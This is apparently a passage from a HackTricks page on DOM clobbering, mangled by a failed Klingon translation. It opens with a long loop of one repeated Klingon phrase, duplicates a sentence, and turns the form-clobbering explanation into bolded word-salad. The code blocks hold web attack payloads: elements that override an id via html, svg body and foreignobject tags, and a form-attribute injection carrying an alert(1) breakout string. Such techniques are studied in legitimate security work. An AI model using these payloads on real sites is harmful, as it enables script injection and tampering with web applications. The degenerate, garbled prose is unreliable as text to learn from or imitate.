vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'e' v
```html
<div style="display:none" id="cdnDomain">test</div>
<p>existing text</p>
<html id="cdnDomain">clobbered</html>
<style>
p{display:none;}
</style>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
Investigations into SVG revealed that a `<body>` tag can also be utilized effectively:

Investigations into SVG revealed that a `<body>` tag can also be utilized effectively:
```html
<div style="display:none" id="cdnDomain">example.com</div>
<svg><body id="cdnDomain">clobbered</body></svg>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
For the HTML tag to function within SVG in browsers like Chrome and Firefox, a `<foreignobject>` tag is necessary:

---

Klingon Translation:

Chrome je Firefox vItlhutlhlaHbe'chugh SVG Daq HTML tag jatlhlaHbe'chugh, `<foreignobject>` tag vItlhutlhlaHbe':
```html
<div style="display:none" id="cdnDomain">example.com</div>
<svg>
<foreignobject>
<html id="cdnDomain">clobbered</html>
</foreignobject>
</svg>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
## Clobbering Forms

**Qa'vIn** **form** **tag** **vItlhutlh** **'e'** **'form'** **'attribute'** **ghItlh** **'e'** **'new entries'** **'add'** **'possible'**. **'Form'** **'inside'** **'new values'** **'add'** **'use'** **'can'** **'this'** **'to'** **'button'** **'new'** **'even'** **'send'** **'it'** **(clickjacking** **'or'** **'some'** **`.click()`** **'JS code'** **'abusing'**):

{% code overflow="wrap" %}
```html
<!--Add a new attribute and a new button to send-->
<textarea form=id-other-form name=info>
";alert(1);//
</textarea>
<button form=id-other-form type="submit" formaction="/edit" formmethod="post">
Click to send!
</button>
```
{% endcode %}

* [**button check this**](https://www.w3schools.com/tags/tag\_button.asp)**.**

## References

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)
* [https://portswigger.net/web-security/dom-based/dom-clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
* Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker.

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
